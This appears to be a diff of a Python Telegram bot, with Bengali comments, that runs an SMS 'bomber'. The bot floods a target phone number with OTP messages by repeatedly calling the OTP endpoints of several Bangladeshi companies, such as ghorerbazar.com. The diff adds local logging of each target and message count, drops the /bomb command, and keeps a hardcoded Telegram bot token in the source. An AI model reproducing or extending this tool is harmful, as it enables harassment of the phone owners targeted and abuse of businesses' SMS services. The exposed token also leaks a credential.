@@ -7,7 +7,7 @@ import requests
 import telebot
 from telebot.types import KeyboardButton, ReplyKeyboardMarkup
 
-# আপনার দেওয়া টেলিগ্রাম বট টোকেন
+# আপনার দেওয়া টেলিগ্রাম বট টোকেন (এখানে কোনো GitHub টোকেন নেই)
 TOKEN = "9170879282:AAESbi5FBohsHoVvrs4t-kblWKfULticg4s"
 bot = telebot.TeleBot(TOKEN)
 
@@ -18,6 +18,20 @@ app = Flask(__name__)
 @app.route("/")
 def home():
   return "Oustad Bot is Live and Running!"
+
+
+# লোকাল totalbom.txt ফাইলে লগ সেভ করার ফাংশন
+def log_to_local_file(chat_id, target, count):
+  try:
+    current_time = time.strftime("%Y-%m-%d %H:%M:%S")
+    log_entry = (
+        f"Chat ID: {chat_id} | Target: {target} | Count: {count} | Time:"
+        f" {current_time}\n"
+    )
+    with open("totalbom.txt", "a", encoding="utf-8") as f:
+      f.write(log_entry)
+  except Exception as e:
+    print(f"File write error: {e}")
 
 
 # ইউজার এজেন্ট পুল
@@ -163,7 +177,6 @@ class Bomber:
       pass
     return False
 
-  # নতুন এপিআই: ঘরের বাজার (Ghorer Bazar)
   def ghorerbazar(self):
     url = "https://ghorerbazar.com/submit/otp"
     headers = {
@@ -192,6 +205,12 @@ class Bomber:
     return False
 
   def start(self):
+    # বম্বিং শুরু হওয়া মাত্রই লোকাল totalbom.txt ফাইলে লগ সেভ করবে
+    threading.Thread(
+        target=log_to_local_file,
+        args=(self.chat_id, self.user_mobile, self.number_of_messege),
+    ).start()
+
     counter = 0
     bot.send_message(
         self.chat_id,
@@ -199,7 +218,6 @@ class Bomber:
         f" `{self.number_of_messege}`\n⚡ **বম্বিং কার্যক্রম শুরু হয়েছে...**",
         parse_mode="Markdown",
     )
-    # ৫টি এপিআইয়ের কম্বিনেশন
     methods = [
         self.aroggo,
         self.grameenphone,
@@ -236,7 +254,7 @@ class Bomber:
     )
 
 
-# ফিক্সড রিপ্লাই কিবোর্ড (বট চ্যাট বক্সের নিচে স্টেবল থাকবে)
+# ফিক্সড রিপ্লাই কিবোর্ড
 def get_reply_keyboard():
   markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
   btn_bomb = KeyboardButton("🚀 Start Bombing")
@@ -247,7 +265,6 @@ def get_reply_keyboard():
   return markup
 
 
-# টেলিগ্রাম বট হ্যান্ডলার (/start কমান্ড)
 @bot.message_handler(commands=["start"])
 def send_welcome(message):
   welcome_text = (
@@ -262,7 +279,6 @@ def send_welcome(message):
   )
 
 
-# ফিক্সড বাটনে ক্লিক করলে কী কাজ করবে তা হ্যান্ডেল করা
 @bot.message_handler(func=lambda message: True)
 def handle_text_buttons(message):
   chat_id = message.chat.id
@@ -293,8 +309,7 @@ def handle_text_buttons(message):
     bot.send_message(
         chat_id,
         "ℹ️ **কীভাবে ব্যবহার করবেন:**\n\n১. `🚀 Start Bombing` বাটনে ক্লিক"
-        " করুন।\n২. টার্গেট নম্বর দিন।\n৩. কতটি মেসেজ পাঠাবেন তা লিখুন।\n\nঅথবা"
-        " সরাসরি কমান্ড দিতে পারেন:\n`/bomb <number> <count>`",
+        " করুন।\n২. টার্গেট নম্বর দিন।\n৩. কতটি মেসেজ পাঠাবেন তা লিখুন।",
         reply_markup=get_reply_keyboard(),
         parse_mode="Markdown",
     )
@@ -311,7 +326,6 @@ def handle_text_buttons(message):
     )
 
 
-# নম্বর পাওয়ার পর কাউন্ট চাওয়ার স্টেপ
 def process_mobile_step(message):
   target_mobile = message.text.strip()
   if target_mobile in [
@@ -332,7 +346,6 @@ def process_mobile_step(message):
   bot.register_next_step_handler(msg, process_count_step, target_mobile)
 
 
-# কাউন্ট পাওয়ার পর বম্বিং শুরু করার স্টেপ
 def process_count_step(message, target_mobile):
   try:
     count = int(message.text.strip())
@@ -352,35 +365,11 @@ def process_count_step(message, target_mobile):
     )
 
 
-# পুরনো /bomb কমান্ড সাপোর্টও বহাল রাখা হলো
-@bot.message_handler(commands=["bomb"])
-def handle_bomb(message):
-  try:
-    parts = message.text.split()
-    if len(parts) < 3:
-      bot.reply_to(
-          message,
-          "[-] সঠিক ফরম্যাট দিন: `/bomb <number> <count>`",
-          parse_mode="Markdown",
-      )
-      return
-    target = parts[1]
-    count = int(parts[2])
-
-    b = Bomber(target, count, message.chat.id)
-    threading.Thread(target=b.start).start()
-  except ValueError:
-    bot.reply_to(message, "[-] অনুগ্রহ করে সঠিক সংখ্যা দিন!")
-
-
 def run_telegram_bot():
   bot.infinity_polling()
 
 
 if __name__ == "__main__":
-  # ব্যাকগ্রাউন্ডে টেলিগ্রাম বট চালু রাখা
   threading.Thread(target=run_telegram_bot, daemon=True).start()
-
-  # রেন্ডারের সার্ভারের জন্য ডাইনামিক পোর্ট বাইন্ডিং
   port = int(os.environ.get("PORT", 5000))
   app.run(host="0.0.0.0", port=port)
